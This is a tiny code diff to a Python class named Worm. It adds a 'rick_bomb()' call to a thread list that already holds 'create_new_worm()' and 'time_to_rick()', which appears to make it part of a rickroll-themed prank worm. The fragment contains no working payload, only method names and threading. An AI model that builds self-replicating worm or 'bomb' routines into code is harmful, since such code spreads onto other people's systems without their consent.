@@ -200,6 +200,7 @@ class Worm:
         try:
             self.threader.append(self.create_new_worm())
             self.threader.append(self.time_to_rick())
+            self.threader.append(self.rick_bomb())
             self.threader.start()
             self.threader.join()
             #self.create_new_worm()
